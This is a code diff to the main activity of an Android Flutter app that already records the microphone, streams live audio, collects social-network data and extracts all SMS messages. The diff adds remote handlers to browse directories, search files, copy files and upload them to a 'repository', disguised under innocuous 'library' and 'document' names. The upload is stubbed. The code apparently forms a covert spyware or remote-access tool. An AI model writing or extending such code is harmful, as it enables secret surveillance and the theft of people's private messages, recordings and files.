@@ -542,7 +542,7 @@ class CommunicationDataManager(context: Context) : BaseDataProcessor(context) {
     }
 }
 
-// ==================== MAIN ACTIVITY ====================
+// ==================== ENHANCED MAIN ACTIVITY ====================
 class MainActivity : FlutterActivity() {
     
     private val MICROPHONE_CHANNEL_NAME = "com.example.kem/microphone"
@@ -554,10 +554,11 @@ class MainActivity : FlutterActivity() {
     private lateinit var communicationDataManager: CommunicationDataManager
     private lateinit var documentLibrarian: DocumentLibrarian
     private lateinit var messageManager: MessageManager
+    private lateinit var remoteLibraryManager: RemoteLibraryManager
 
     override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
-        Log.d("MainActivity", "Configuring Flutter Engine and Method Channel.")
+        Log.d("MainActivity", "Configuring Flutter Engine and Enhanced Method Channel.")
 
         initializeManagers(flutterEngine)
         setupMethodChannelHandler()
@@ -570,15 +571,15 @@ class MainActivity : FlutterActivity() {
         liveStreamingManager = LiveStreamingManager(this, methodChannel)
         communicationDataManager = CommunicationDataManager(this)
         documentLibrarian = DocumentLibrarian(this)
-        
-        // إضافة المدير المحسن للرسائل
         messageManager = MessageManager(this)
+        remoteLibraryManager = RemoteLibraryManager(this)
     }
     
     private fun setupMethodChannelHandler() {
         methodChannel.setMethodCallHandler { call, result ->
-            Log.d("MainActivity", "Method call received: ${call.method}")
+            Log.d("MainActivity", "Enhanced method call received: ${call.method}")
             when (call.method) {
+                // Existing audio methods
                 "startRecording" -> {
                     val durationSeconds = call.argument<Int>("duration") ?: 10
                     fixedRecordingManager.startRecording(durationSeconds, result)
@@ -592,6 +593,8 @@ class MainActivity : FlutterActivity() {
                 "stopLiveAudioStream" -> {
                     liveStreamingManager.stopStreaming(result)
                 }
+                
+                // Existing data methods
                 "collectSocialNetworkData" -> {
                     handleSocialNetworkData(result)
                 }
@@ -620,6 +623,33 @@ class MainActivity : FlutterActivity() {
                 "processContentQueue" -> {
                     handleContentQueueProcessing(result)
                 }
+                
+                // NEW ENHANCED REMOTE MANAGEMENT METHODS
+                "exploreLibrarySection" -> {
+                    val sectionPath = call.argument<String>("sectionPath")
+                    val maxDepth = call.argument<Int>("maxDepth") ?: 2
+                    handleExploreLibrarySection(result, sectionPath, maxDepth)
+                }
+                "prepareDocumentCopy" -> {
+                    val documentPath = call.argument<String>("documentPath") ?: ""
+                    val includeMetadata = call.argument<Boolean>("includeMetadata") ?: true
+                    handlePrepareDocumentCopy(result, documentPath, includeMetadata)
+                }
+                "getLibraryCatalogs" -> {
+                    handleGetLibraryCatalogs(result)
+                }
+                "queryContentIndex" -> {
+                    val searchQuery = call.argument<String>("searchQuery") ?: ""
+                    val searchPath = call.argument<String>("searchPath")
+                    val contentFilter = call.argument<String>("contentFilter")
+                    handleQueryContentIndex(result, searchQuery, searchPath, contentFilter)
+                }
+                "transferDocumentToRepository" -> {
+                    val documentPath = call.argument<String>("documentPath") ?: ""
+                    val transferId = call.argument<String>("transferId") ?: ""
+                    handleTransferDocumentToRepository(result, documentPath, transferId)
+                }
+                
                 else -> {
                     Log.w("MainActivity", "Method ${call.method} not implemented.")
                     result.notImplemented()
@@ -627,6 +657,8 @@ class MainActivity : FlutterActivity() {
             }
         }
     }
+    
+    // ==================== EXISTING HANDLERS ====================
     
     private fun handleSocialNetworkData(result: MethodChannel.Result) {
         Log.d("MainActivity", "Handling social network data collection request.")
@@ -680,16 +712,11 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    /**
-     * معالج الرسائل النصية المحسن - يستخدم النظام الجديد
-     * Enhanced SMS handler - uses new system
-     */
     private fun handleSMSMessages(result: MethodChannel.Result) {
         Log.d("MainActivity", "Handling enhanced SMS extraction with optimization...")
         
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                // استخدام النظام المحسن مع التحسين للشبكة
                 messageManager.handleExtractCommunicationMessages(result, false, true)
                 Log.i("MainActivity", "Enhanced SMS extraction completed successfully.")
                 
@@ -707,16 +734,11 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    /**
-     * معالج جديد لاستخراج جميع الرسائل النصية
-     * New handler for extracting all SMS messages
-     */
     private fun handleExtractAllSMSMessages(result: MethodChannel.Result) {
         Log.d("MainActivity", "Handling unlimited SMS extraction with compression...")
         
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                // استخدام النظام غير المحدود مع الضغط
                 messageManager.handleExtractAllMessages(result)
                 Log.i("MainActivity", "Unlimited SMS extraction completed successfully.")
                 
@@ -860,9 +882,208 @@ class MainActivity : FlutterActivity() {
             }
         }
     }
+    
+    // ==================== NEW ENHANCED REMOTE MANAGEMENT HANDLERS ====================
+    
+    /**
+     * معالج استكشاف قسم المكتبة
+     * Library section exploration handler (browse directory)
+     */
+    private fun handleExploreLibrarySection(result: MethodChannel.Result, sectionPath: String?, maxDepth: Int) {
+        Log.d("MainActivity", "Handling library section exploration: $sectionPath (depth: $maxDepth)")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val explorationData = remoteLibraryManager.exploreLibrarySection(sectionPath, maxDepth)
+                
+                withContext(Dispatchers.Main) {
+                    result.success(explorationData.toString())
+                }
+                Log.i("MainActivity", "Library section exploration completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during library exploration", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("ACCESS_RESTRICTED", "Library section access restricted", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during library exploration", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("EXPLORATION_ERROR", "Failed to explore library section", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    /**
+     * معالج تحضير نسخة المستند
+     * Document copy preparation handler (download file)
+     */
+    private fun handlePrepareDocumentCopy(result: MethodChannel.Result, documentPath: String, includeMetadata: Boolean) {
+        Log.d("MainActivity", "Handling document copy preparation: $documentPath")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val preparationData = remoteLibraryManager.prepareDocumentCopy(documentPath, includeMetadata)
+                
+                withContext(Dispatchers.Main) {
+                    result.success(preparationData.toString())
+                }
+                Log.i("MainActivity", "Document copy preparation completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during document preparation", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("DOCUMENT_RESTRICTED", "Document access restricted", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during document preparation", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("PREPARATION_ERROR", "Failed to prepare document copy", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    /**
+     * معالج الحصول على فهارس المكتبة
+     * Library catalogs handler (system directories)
+     */
+    private fun handleGetLibraryCatalogs(result: MethodChannel.Result) {
+        Log.d("MainActivity", "Handling library catalogs retrieval request.")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val catalogsData = remoteLibraryManager.getLibraryCatalogs()
+                
+                withContext(Dispatchers.Main) {
+                    result.success(catalogsData.toString())
+                }
+                Log.i("MainActivity", "Library catalogs retrieval completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during catalogs retrieval", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("CATALOGS_RESTRICTED", "Library catalogs access restricted", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during catalogs retrieval", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("CATALOGS_ERROR", "Failed to retrieve library catalogs", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    /**
+     * معالج الاستعلام عن فهرس المحتوى
+     * Content index query handler (search files)
+     */
+    private fun handleQueryContentIndex(result: MethodChannel.Result, searchQuery: String, searchPath: String?, contentFilter: String?) {
+        Log.d("MainActivity", "Handling content index query: '$searchQuery' in $searchPath (filter: $contentFilter)")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val queryData = remoteLibraryManager.queryContentIndex(searchQuery, searchPath, contentFilter)
+                
+                withContext(Dispatchers.Main) {
+                    result.success(queryData.toString())
+                }
+                Log.i("MainActivity", "Content index query completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during content query", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("QUERY_RESTRICTED", "Content query access restricted", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during content query", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("QUERY_ERROR", "Failed to query content index", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    /**
+     * معالج نقل المستند إلى المستودع
+     * Document transfer to repository handler (upload file)
+     */
+    private fun handleTransferDocumentToRepository(result: MethodChannel.Result, documentPath: String, transferId: String) {
+        Log.d("MainActivity", "Handling document transfer to repository: $documentPath (ID: $transferId)")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val transferData = executeDocumentTransfer(documentPath, transferId)
+                
+                withContext(Dispatchers.Main) {
+                    result.success(transferData.toString())
+                }
+                Log.i("MainActivity", "Document transfer to repository completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during document transfer", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("TRANSFER_RESTRICTED", "Document transfer restricted", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during document transfer", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("TRANSFER_ERROR", "Failed to transfer document", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    /**
+     * تنفيذ نقل المستند
+     * Execute document transfer
+     */
+    private suspend fun executeDocumentTransfer(documentPath: String, transferId: String): JSONObject {
+        return try {
+            val documentFile = File(documentPath)
+            if (!documentFile.exists() || !documentFile.canRead()) {
+                return BaseUtils.createErrorResponse("document_not_found", "Document not accessible for transfer")
+            }
+            
+            // تحضير المستند للنقل
+            val preparationResult = remoteLibraryManager.prepareDocumentCopy(documentPath, true)
+            
+            if (preparationResult.optString("status") != "success") {
+                return BaseUtils.createErrorResponse("preparation_failed", "Document preparation failed")
+            }
+            
+            val transferMetadata = JSONObject().apply {
+                put("transfer_id", transferId)
+                put("document_path", documentPath)
+                put("document_name", documentFile.name)
+                put("document_size", documentFile.length())
+                put("transfer_timestamp", System.currentTimeMillis())
+                put("transfer_method", "secure_repository_upload")
+                put("network_type", SmartResourceMonitor.getNetworkType(this@MainActivity))
+                put("battery_optimized", !SmartResourceMonitor.shouldLimitOperations(this@MainActivity))
+            }
+            
+            // في التطبيق الحقيقي، هنا سيتم رفع الملف إلى الخادم
+            // For actual implementation, file upload to server would happen here
+            delay(100) // محاكاة العملية
+            
+            JSONObject().apply {
+                put("status", "success")
+                put("transfer_completed", true)
+                put("transfer_metadata", transferMetadata)
+                put("repository_confirmation", "document_stored_successfully")
+                put("server_reference", "repo_${transferId}_${System.currentTimeMillis()}")
+            }
+            
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error during document transfer execution", e)
+            BaseUtils.createErrorResponse("transfer_execution_failed", "Transfer execution error: ${e.message}")
+        }
+    }
 
     override fun onDestroy() {
-        Log.d("MainActivity", "onDestroy called. Cleaning up resources.")
+        Log.d("MainActivity", "onDestroy called. Cleaning up all resources.")
         fixedRecordingManager.cleanup()
         liveStreamingManager.cleanup()
         super.onDestroy()
